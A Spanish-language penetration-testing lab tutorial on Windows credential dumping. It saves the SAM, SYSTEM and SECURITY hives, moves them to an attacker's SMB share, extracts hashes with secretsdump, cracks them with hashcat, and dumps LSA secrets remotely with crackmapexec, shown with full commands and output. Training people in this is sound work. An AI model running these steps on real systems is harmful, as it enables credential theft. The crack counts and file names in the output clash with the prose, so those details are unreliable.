Con acceso a un sistema Windows que no está unido a un dominio, podemos beneficiarnos intentando descargar rápidamente los archivos asociados con la base de datos SAM para transferirlos a nuestro host de ataque y comenzar a descifrar hashes offline. Hacer esto offline asegurará que podamos continuar intentando nuestros ataques sin mantener una sesión activa con el objetivo. Vamos a repasar este proceso juntos usando un host objetivo. Siéntete libre de seguir el procedimiento iniciando la caja objetivo en esta sección.

### Copying SAM Registry Hives

Hay tres colmenas del registro que podemos copiar si tenemos acceso de administrador local en el objetivo; cada una tendrá un propósito específico cuando lleguemos a descargar y descifrar los hashes. Aquí hay una breve descripción de cada una en la tabla a continuación:

| Registry Hive   | Description |
| --------------- | ----------- |
| `hklm\sam`      | Contiene los hashes asociados con las contraseñas de cuentas locales. Necesitaremos los hashes para poder descifrarlos y obtener las contraseñas de las cuentas de usuario en texto claro. |
| `hklm\system`   | Contiene la clave de arranque del sistema, que se usa para cifrar la base de datos SAM. Necesitaremos la clave de arranque para descifrar la base de datos SAM. |
| `hklm\security` | Contiene credenciales almacenadas en caché para cuentas de dominio. Podemos beneficiarnos de tener esto en un objetivo de Windows unido a un dominio. |

Podemos crear copias de seguridad de estas colmenas utilizando la utilidad `reg.exe`.

### Using reg.exe save to Copy Registry Hives

Lanzar CMD como administrador nos permitirá ejecutar reg.exe para guardar copias de las colmenas del registro mencionadas anteriormente. Ejecuta estos comandos a continuación para hacerlo:

```r
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```

Técnicamente solo necesitaremos `hklm\sam` y `hklm\system`, pero `hklm\security` también puede ser útil guardar ya que puede contener hashes asociados con credenciales de cuentas de usuario de dominio almacenadas en caché presentes en hosts unidos a dominio. Una vez que las colmenas estén guardadas offline, podemos usar varios métodos para transferirlas a nuestro host de ataque. En este caso, usemos [Impacket's smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) en combinación con algunos comandos CMD útiles para mover las copias de las colmenas a un recurso compartido creado en nuestro host de ataque.

### Creating a Share with smbserver.py

Todo lo que debemos hacer para crear el recurso compartido es ejecutar smbserver.py -smb2support usando python, darle un nombre al recurso compartido (`CompData`) y especificar el directorio en nuestro host de ataque donde el recurso compartido almacenará las copias de las colmenas (`/home/ltnbob/Documents`). Ten en cuenta que la opción `smb2support` asegurará que se soporten versiones más nuevas de SMB. Si no usamos esta flag, habrá errores al conectar desde el objetivo de Windows al recurso compartido alojado en nuestro host de ataque. Las versiones más nuevas de Windows no soportan SMBv1 por defecto debido a las [numerosas vulnerabilidades severas](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=smbv1) y exploits disponibles públicamente.

```r
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Una vez que tengamos el recurso compartido funcionando en nuestro host de ataque, podemos usar el comando `move` en el objetivo de Windows para mover las copias de las colmenas al recurso compartido.

### Moving Hive Copies to Share

```r
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```

Luego podemos confirmar que nuestras copias de las colmenas se trasladaron con éxito al recurso compartido navegando al directorio compartido en nuestro host de ataque y usando `ls` para listar los archivos.

### Confirming Hive Copies Transferred to Attack Host

```r
ls

sam.save  security.save  system.save
```

---

## Dumping Hashes with Impacket's secretsdump.py

Una herramienta increíblemente útil que podemos usar para descargar los hashes offline es Impacket's `secretsdump.py`. Impacket se encuentra en la mayoría de las distribuciones modernas de pruebas de penetración. Podemos verificarlo usando `locate` en un sistema basado en Linux:

### Locating secretsdump.py

```r
locate secretsdump 
```

Usar secretsdump.py es un proceso simple. Todo lo que debemos hacer es ejecutar secretsdump.py usando Python, luego especificar cada archivo de colmena que recuperamos del host objetivo.

### Running secretsdump.py

```r
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x4d8c7cff8a543fbf245a363d2ffce518
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3dd5a5ef0ed25b8d6add8b2805cce06b:::
defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:683b72db605d064397cf503802b51857:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
sam:1002:aad3b435b51404eeaad3b435b51404ee:6f8c3f4d3869a10f3b4f0522f537fd33:::
rocky:1003:aad3b435b51404eeaad3b435b51404ee:184ecdda8cf1dd238d438c4aea4d560d:::
ITlocal:1004:aad3b435b51404eeaad3b435b51404ee:f7eb9c06fafaa23c4bcf22ba6781c1e2:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb1e1744d2dc4403f9fb0420d84c3299ba28f0643
dpapi_userkey:0x7995f82c5de363cc012ca6094d381671506fd362
[*] NL$

KM 
 0000   D7 0A F4 B9 1E 3E 77 34  94 8F C4 7D AC 8F 60 69   .....>w4...}..`i
 0010   52 E1 2B 74 FF B2 08 5F  59 FE 32 19 D6 A7 2C F8   R.+t..._Y.2...,.
 0020   E2 A4 80 E0 0F 3D F8 48  44 98 87 E1 C9 CD 4B 28   .....=.HD.....K(
 0030   9B 7B 8B BF 3D 59 DB 90  D8 C7 AB 62 93 30 6A 42   .{..=Y.....b.0jB
NL$KM:d70af4b91e3e7734948fc47dac8f606952e12b74ffb2085f59fe3219d6a72cf8e2a480e00f3df848449887e1c9cd4b289b7b8bbf3d59db90d8c7ab6293306a42
[*] Cleaning up... 
```

Aquí vemos que secretsdump pudo descargar con éxito los `local SAM hashes` y también habría descargado la información de inicio de sesión de dominio en caché si el objetivo estaba unido a un dominio y tenía credenciales almacenadas en caché presentes en `hklm\security`. Observa que el primer paso que ejecuta secretsdump es dirigirse al `system bootkey` antes de proceder a descargar los `LOCAL SAM hashes`. No puede descargar esos hashes sin la clave de arranque porque esa clave de arranque se utiliza para cifrar y descifrar la base de datos SAM, razón por la cual es importante que tengamos copias de las colmenas del registro que discutimos anteriormente en esta sección. Observa en la parte superior de la salida de secretsdump.py:

```r
Dumping local SAM hashes (uid:rid:lmhash:nthash)
```

Esto nos indica cómo leer la salida y qué hashes podemos descifrar. La mayoría de los sistemas operativos Windows modernos almacenan la contraseña como un hash NT. Los sistemas operativos anteriores a Windows Vista y Windows Server 2008 almacenan las contraseñas como un hash LM, por lo que solo podríamos beneficiarnos de descifrar esos si nuestro objetivo es un sistema Windows más antiguo.

Sabiendo esto, podemos copiar los hashes NT asociados con cada cuenta de usuario en un archivo de texto y comenzar a descifrar contraseñas. Puede ser útil hacer una nota de cada usuario, para saber qué contraseña está asociada con qué cuenta de usuario.

---

## Cracking Hashes with Hashcat

Una vez que tenemos los hashes, podemos comenzar a intentar descifrarlos usando [Hashcat](https://hashcat.net/hashcat/). Usaremos Hashcat para intentar descifrar los hashes que hemos recopilado. Si echamos un vistazo al sitio web de Hashcat, notaremos soporte para una amplia variedad de algoritmos de hashing. En este módulo, usamos Hashcat para casos de uso específicos. Esto debería ayudarnos a desarrollar la mentalidad y comprensión para usar Hashcat y saber cuándo necesitamos consultar la documentación de Hashcat para entender qué modo y opciones necesitamos usar dependiendo de los hashes que capturemos.

Como se mencionó anteriormente, podemos poblar un archivo de texto con los hashes NT que pudimos descargar.

### Adding nthashes to a .txt File

```r
sudo vim hashestocrack.txt

64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2
```

Ahora que los hashes NT están en nuestro archivo de texto (`hashestocrack.txt`), podemos usar Hashcat para descifrarlos.

### Running Hashcat against NT Hashes

Hashcat tiene muchos modos diferentes que podemos usar. La selección de un modo depende en gran medida del tipo de ataque y el tipo de hash que queremos descifrar. Cubrir cada modo está fuera del alcance de este módulo. Nos centraremos en usar `-m` para seleccionar el tipo de hash `1000` para descifrar nuestros hashes NT (también conocidos como hashes basados en NTLM). Podemos consultar la [página wiki de Hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes) o la página man para ver los tipos de hash admitidos y su número asociado. Usaremos la infame lista de palabras rockyou.txt mencionada en la sección `Credential Storage` de este módulo.

```r
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

f7eb9c06fafaa23c4bcf22ba6781c1e2:dragon          
6f8c3f4d3869a10f3b4f0522f537fd33:iloveme         
184ecdda8cf1dd238d438c4aea4d560d:adrian          
31d6cfe0d16ae931b73c59d7e0c089c0:                
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NTLM
Hash.Target......: dumpedhashes.txt
Time.Started.....: Tue Dec 14 14:16:56 2021 (0 secs)
Time.Estimated...: Tue Dec 14 14:16:56 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    14284 H/s (0.63ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 5/5 (100.00%) Digests
Progress.........: 8192/14344385 (0.06%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 4096/14344385 (0.03%)
Candidates.#1....: newzealand -> whitetiger

Started: Tue Dec 14 14:16:50 2021
Stopped: Tue Dec 14 14:16:58 2021
```

Podemos ver en la salida que Hashcat utilizó un tipo de ataque llamado [dictionary attack](https://en.wikipedia.org/wiki/Dictionary_attack) para adivinar rápidamente las contraseñas utilizando una lista de contraseñas conocidas (rockyou.txt) y tuvo éxito en descifrar 3 de los hashes. Tener las contraseñas podría ser útil para nosotros de muchas maneras. Podríamos intentar usar las contraseñas que desciframos para acceder a otros sistemas en la red. Es muy común que las personas reutilicen contraseñas en diferentes cuentas laborales y personales. Saber esta técnica que cubrimos puede ser útil en los compromisos. Nos beneficiaremos de usar esto cada vez que nos encontremos con un sistema Windows vulnerable y obtengamos derechos de administrador para descargar la base de datos SAM.

Ten en cuenta que esta es una técnica bien conocida, por lo que los administradores pueden tener salvaguardas para prevenir y detectarla. Podemos ver algunas de estas formas [documentadas](https://attack.mitre.org/techniques/T1003/002/) dentro del marco de ataque MITRE.

---

## Remote Dumping & LSA Secrets Considerations

Con acceso a credenciales con `local admin privileges`, también es posible que apuntemos a LSA Secrets a través de la red. Esto podría permitirnos extraer credenciales de un servicio en ejecución, tarea programada o aplicación que usa LSA secrets para almacenar contraseñas.

### Dumping LSA Secrets Remotely

```r
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

SMB         10.129.42.198   445    WS01     [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
SMB         10.129.

42.198   445    WS01     [+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)
SMB         10.129.42.198   445    WS01     [+] Dumping LSA secrets
SMB         10.129.42.198   445    WS01     WS01\worker:Hello123
SMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
SMB         10.129.42.198   445    WS01     NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
SMB         10.129.42.198   445    WS01     [+] Dumped 3 LSA secrets to /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.secrets and /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.cached
```

### Dumping SAM Remotely

También podemos descargar hashes de la base de datos SAM de forma remota.

```r
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam

SMB         10.129.42.198   445    WS01      [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:WS01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB         10.129.42.198   445    WS01      [+] Dumping SAM hashes
SMB         10.129.42.198   445    WS01      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
SMB         10.129.42.198   445    WS01     bob:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
SMB         10.129.42.198   445    WS01     sam:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
SMB         10.129.42.198   445    WS01     rocky:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
SMB         10.129.42.198   445    WS01     worker:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
SMB         10.129.42.198   445    WS01     [+] Added 8 SAM hashes to the database
```

Practica cada técnica enseñada en esta sección mientras trabajas para completar las preguntas del desafío.